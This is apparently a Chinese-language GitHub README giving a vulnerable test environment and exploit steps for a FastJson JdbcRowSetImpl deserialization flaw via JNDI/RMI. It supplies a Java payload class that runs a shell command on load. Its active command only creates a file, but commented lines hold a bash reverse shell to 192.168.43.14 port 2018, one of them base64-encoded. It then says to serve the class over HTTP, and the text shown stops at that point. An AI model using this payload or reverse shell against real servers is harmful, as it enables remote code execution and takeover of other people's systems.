# FastJson-JdbcRowSetImpl
### JNDI加载RMI方式，附漏洞环境 &amp; 利用Exp。

## 环境构建

```
root@Bearcat:/# wget "https://github.com/iBearcat/FastJson-JdbcRowSetImpl/raw/master/FastJson_Vul.war" -P path.... & cd  ${path}/opt/apache-tomcat-8.5.24/bin & ./startup.sh"
```

![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/1.jpg?raw=true)

### 访问漏洞环境 http://localhost:8888/FastJson_Vul

![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/2.jpg?raw=true)

## 漏洞利用

### CommandObject.java

### javac CommandObject.java

```
import	java.lang.Runtime;
import	java.lang.Process;
public class CommandObject {
    public CommandObject(){
        try{
			Runtime	rt	=	Runtime.getRuntime();
			//Runtime.getRuntime().exec("/bin/bash -i >&/dev/tcp/192.168.43.14/2018<&1");
			//String[] commands = {"bash -c {echo,L2Jpbi9iYXNoIC1pID4mL2Rldi90Y3AvMTkyLjE2OC40My4xNC8yMDE4PCYx}|{base64,-d}|{bash,-i}"};
			
			String[] commands = {"touch","/opt/test"};
			Process	pc = rt.exec(commands);
			pc.waitFor();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        CommandObject e = new CommandObject();
    }
}
```

### 开启一个HTTP服务

### 如：

```
Python2 -m SimpleHTTPServer 80
Python3 -m http.server 80
```
